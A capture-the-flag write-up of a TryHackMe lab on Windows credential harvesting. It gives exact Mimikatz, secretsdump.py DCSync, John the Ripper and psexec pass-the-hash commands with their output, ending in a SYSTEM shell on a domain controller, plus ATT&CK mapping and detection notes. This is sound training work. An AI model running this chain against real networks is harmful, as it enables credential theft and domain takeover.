# Introduction to Credential Harvesting — TryHackMe Writeup

**Author:** Artem  
**Platform:** TryHackMe  
**Room:** Introduction to Credential Harvesting  
**Difficulty:** Medium  
**Date:** 2026-05-25  
**Tags:** Credential Harvesting, Mimikatz, DPAPI, Windows Vault, SAM, NTLM, LSA Secrets, NTDS.dit, DCSync, Pass-the-Hash, Impacket, secretsdump, John the Ripper, DCC2

---

## Overview

A hands-on room covering the five core Windows credential storage locations — LSASS Memory, SAM + SYSTEM hives, LSA Secrets, DPAPI Vault, and NTDS.dit — with practical extraction using Mimikatz, Impacket's secretsdump.py, and John the Ripper. The room progresses from local credential extraction on a workstation to a full DCSync attack against the domain controller, ending with Pass-the-Hash access to retrieve the final flag.

**Flag:** `THM{gotta_l0ve_cr3dential_st0res}`

---

## Credential Storage Theory (Task 2)

Windows and Active Directory store credentials in five key locations:

| Storage | Contents | Location |
|---------|----------|----------|
| LSASS Memory | NTLM hashes, Kerberos tickets, plaintext (WDigest) | `lsass.exe` process memory |
| SAM + SYSTEM | NTLM hashes of local accounts | `C:\Windows\System32\config\` |
| LSA Secrets | Service account passwords, cached domain creds, machine account password | `HKLM\SECURITY\Policy\Secrets` |
| DPAPI Vault | Saved passwords (RDP, web, SMB shares) | `%APPDATA%\Microsoft\Credentials\` |
| NTDS.dit | All domain user hashes, Kerberos keys | `C:\Windows\NTDS\` (DC only) |

Key takeaway: SAM holds only local accounts. NTDS.dit holds all domain accounts. LSASS caches credentials of anyone who logged in interactively. LSA Secrets stores service account passwords in cleartext.

---

## Windows Vault Enumeration with Mimikatz (Task 3)

Connected to the target via RDP as Administrator:

```
xfreerdp /u:Administrator /p:'N3w34829DJdd?1' /v:10.220.10.20 /dynamic-resolution
```

### Listing Vaults

```
mimikatz # vault::list
```

Output revealed two vaults:
- **Web Credentials** — empty (0 items)
- **Windows Credentials** — 1 item: `TRYHACKME\svc-app` targeting machine `WRK`

### Extracting Vault Credentials

First, enabled SeDebugPrivilege (required for patching vault process memory):

```
mimikatz # privilege::debug
Privilege '20' OK
```

Then extracted credentials:

```
mimikatz # vault::cred /patch
```

**Findings:**

| Target | Username | Password | Type |
|--------|----------|----------|------|
| WRK | `TRYHACKME\svc-app` | `S3rv!c3Acc!` | domain_password |
| gmail.com | `ElonTusk` | `MyTusksAreThaB3st` | generic |

The gmail credential was saved via Windows Credential Manager (IE/Edge "Save password" prompt or manual addition through Control Panel → Credential Manager). This demonstrates why saved browser/system credentials are a goldmine during post-exploitation.

### Mistakes Made

- Typo: ran `vailt::list` instead of `vault::list` — Mimikatz returned "module not found". Lesson: double-check module names.
- Ran `vault::cred /patch` before `privilege::debug` — got `Access Denied (0x00000005)`. Lesson: always run `privilege::debug` first before any memory-access operations.

---

## SAM + SYSTEM Extraction with secretsdump.py (Task 4)

### Remote Dump from Workstation

```bash
secretsdump.py WRK/Administrator:N3w34829DJdd?1@10.220.10.20 -output local_dump
```

secretsdump.py remotely started the `RemoteRegistry` service, extracted SAM/SYSTEM/SECURITY hives, and cleaned up after itself.

**SAM — Local Account Hashes:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:78165db7b3687203aa6eb88332504bda:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:95f2822ae7e725c8e30b2b31f66c1b86:::
LocalUser1:1000:aad3b435b51404eeaad3b435b51404ee:dae57d78fec919471799ce0fae8236b9:::
ElonTusk:1001:aad3b435b51404eeaad3b435b51404ee:e30bcb814d589a0d67a37aa9dc2ae5ba:::
```

Hash format: `username:RID:LM_hash:NTLM_hash:::`. The LM hash `aad3b435b51404eeaad3b435b51404ee` is the empty/disabled LM hash (present on all modern Windows). Guest and DefaultAccount share hash `31d6cfe0d16ae931b73c59d7e0c089c0` — the hash of an empty password (accounts disabled).

**Cached Domain Credentials (DCC2):**

```
TRYHACKME.LOC/Administrator:$DCC2$10240#Administrator#ea671e1143604bb87c6d48f6b5475c08
TRYHACKME.LOC/raoulduke:$DCC2$10240#raoulduke#1f7300ae177dbc29bf756b1039313e0b
TRYHACKME.LOC/svc-app:$DCC2$10240#svc-app#5dd6a528924564f54ec099a133821921
TRYHACKME.LOC/drgonzo:$DCC2$10240#drgonzo#d0dc1647e45cf7364ecec3c7740fce0f
TRYHACKME.LOC/HunterThompson:$DCC2$10240#HunterThompson#6bcf3ea1652bcad3ed455e0a970ca10b
```

These are the last 5 domain users who logged into WRK. DCC2 hashes allow offline login when DC is unreachable.

**LSA Secrets:**
- `$MACHINE.ACC` — machine account `WRK$` password and Kerberos keys (AES256, AES128, DES, NTLM)
- `DPAPI_SYSTEM` — machine-level DPAPI master keys
- `NL$KM` — encryption key for cached domain credentials

---

## Cracking DCC2 Hash (Task 4)

Saved drgonzo's DCC2 hash to a file:

```bash
echo '$DCC2$10240#drgonzo#d0dc1647e45cf7364ecec3c7740fce0f' > dc2_hash.txt
```

Cracked with John the Ripper:

```bash
john --format=mscash2 dc2_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
lasvegas1        (?)
1g 0:00:00:11 DONE
```

**drgonzo password: `lasvegas1`**

Note: DCC2 uses 10240 iterations of PBKDF2-SHA1, making it significantly slower to crack than NTLM. John managed it in 11 seconds only because the password was in rockyou.

---

## DCSync — Dumping the Entire Domain (Task 4)

With drgonzo's credentials (a domain admin), performed a DCSync attack against the domain controller:

```bash
secretsdump.py TRYHACKME/drgonzo:lasvegas1@10.220.10.10 -just-dc -output dc_dump
```

The `-just-dc` flag uses the DRSUAPI replication protocol (MS-DRSR) instead of remote registry access. The DC believes it's replicating with another domain controller and hands over the entire NTDS.dit database.

**Domain User Hashes:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d71ee9fb6a3f54496bdc6c941f7a2903:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:399b08294203eeafef6c1ec6d5747127:::
raoulduke:1609:aad3b435b51404eeaad3b435b51404ee:3a21525d05796b78061c988f2d0233b4:::
svc-app:1610:aad3b435b51404eeaad3b435b51404ee:df35591a02f03fc5a79e25587a3fdf1e:::
drgonzo:1611:aad3b435b51404eeaad3b435b51404ee:7605d80926c7f7820f22100429b0bb91:::
HunterThompson:1613:aad3b435b51404eeaad3b435b51404ee:719041ba5f4f61ec359d324f06ab7cd2:::
DC$:1008:aad3b435b51404eeaad3b435b51404ee:07e6e398a28cba9f469c49bd170968f8:::
WRK$:1111:aad3b435b51404eeaad3b435b51404ee:f6dca6027f8479810acbe9b5a6d3ef4b:::
```

Kerberos keys (AES256, AES128, DES) were also extracted for every account.

**Critical hashes:**
- `Administrator` NTLM: `d71ee9fb6a3f54496bdc6c941f7a2903` — Domain Admin, full access
- `krbtgt` NTLM: `399b08294203eeafef6c1ec6d5747127` — enables Golden Ticket attack

---

## Pass-the-Hash → Domain Controller (Task 4)

Used the Domain Administrator NTLM hash to gain SYSTEM shell on the DC without knowing the plaintext password:

```bash
psexec.py 'TRYHACKME/Administrator@10.220.10.10' -hashes :d71ee9fb6a3f54496bdc6c941f7a2903
```

The `:hash` syntax (colon prefix, no LM hash) is shorthand — equivalent to `aad3b435b51404eeaad3b435b51404ee:d71ee9fb6a3f54496bdc6c941f7a2903`.

```
[*] Found writable share ADMIN$
[*] Uploading file BHeNaZXf.exe
[*] Creating service vOnl on 10.220.10.10.....
[*] Starting service vOnl.....
C:\Windows\system32> whoami
nt authority\system
```

psexec.py authenticates via SMB using the NTLM hash, uploads a service binary to `ADMIN$`, creates and starts a Windows service, and redirects I/O through a named pipe — resulting in a SYSTEM-level shell.

### Flag

```
C:\Users\Administrator\Desktop> type flag.txt.txt
THM{gotta_l0ve_cr3dential_st0res}
```

---

## Attack Path Summary

```
RDP as local Admin (WRK)
  │
  ├─► Mimikatz vault::cred /patch
  │     → svc-app password, ElonTusk gmail creds
  │
  ├─► secretsdump.py (remote registry)
  │     → Local SAM hashes (6 accounts)
  │     → Cached domain creds (DCC2) for 5 domain users
  │     → LSA Secrets (machine account, DPAPI keys)
  │
  ├─► John the Ripper (mscash2)
  │     → Cracked drgonzo DCC2 hash → lasvegas1
  │
  ├─► secretsdump.py -just-dc (DCSync)
  │     → All domain hashes (Administrator, krbtgt, all users)
  │
  └─► psexec.py Pass-the-Hash
        → SYSTEM shell on DC → flag
```

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Tool / Method |
|--------|-----------|-----|---------------|
| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 | Mimikatz `sekurlsa::logonpasswords` |
| Credential Access | OS Credential Dumping: Security Account Manager | T1003.002 | secretsdump.py (remote registry) |
| Credential Access | OS Credential Dumping: NTDS | T1003.003 | secretsdump.py `-just-dc` (DCSync) |
| Credential Access | OS Credential Dumping: LSA Secrets | T1003.004 | secretsdump.py |
| Credential Access | OS Credential Dumping: Cached Domain Credentials | T1003.005 | secretsdump.py + John `mscash2` |
| Credential Access | Credentials from Password Stores: Windows Credential Manager | T1555.004 | Mimikatz `vault::cred /patch` |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 | Gmail creds in Credential Manager |
| Lateral Movement | Use Alternate Authentication Material: Pass the Hash | T1550.002 | psexec.py with NTLM hash |
| Execution | System Services: Service Execution | T1569.002 | psexec.py (service creation on DC) |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Mimikatz | `privilege::debug`, `vault::list`, `vault::cred /patch` — DPAPI vault extraction |
| secretsdump.py (Impacket) | Remote SAM/SYSTEM/SECURITY dump, DCSync via DRSUAPI |
| John the Ripper | DCC2 hash cracking (`--format=mscash2`) |
| psexec.py (Impacket) | Pass-the-Hash → SYSTEM shell on DC |
| xfreerdp | RDP access to target workstation |

---

## Lessons Learned

1. **Always run `privilege::debug` before Mimikatz memory operations.** Without SeDebugPrivilege, Mimikatz cannot access other processes' memory. Got `Access Denied (0x00000005)` on `vault::cred /patch` until this was activated.

2. **Typos in Mimikatz module names are silent failures.** `vailt::list` returned "module not found" with no helpful suggestion. Mimikatz has no autocomplete or fuzzy matching — exact spelling is required.

3. **DCC2 ≠ NTLM for cracking speed.** DCC2 uses PBKDF2 with 10240 iterations, making brute-force orders of magnitude slower than NTLM. A weak password like `lasvegas1` still cracks fast against rockyou, but a strong password would be effectively uncrackable offline.

4. **DCSync doesn't touch the DC filesystem.** The `-just-dc` flag replicates credentials through the DRSUAPI protocol — no file access, no service creation on the DC itself. This makes it harder to detect than Volume Shadow Copy or ntdsutil-based extraction.

5. **Pass-the-Hash only needs the NT hash.** The `:hash` shorthand (omitting LM) works because LM hashes are disabled on modern Windows. The `aad3b435...` value is just a placeholder.

6. **Windows Credential Manager stores everything in cleartext (once decrypted).** Users saving passwords through "Remember my credentials" prompts — for RDP, SMB shares, or browsers (IE/Edge) — are creating a credential goldmine for any attacker with admin access.

7. **RemoteRegistry service start/stop in logs is a detection indicator.** secretsdump.py starts RemoteRegistry, extracts hives, and stops it. Blue teams monitoring this service state change can flag credential harvesting.
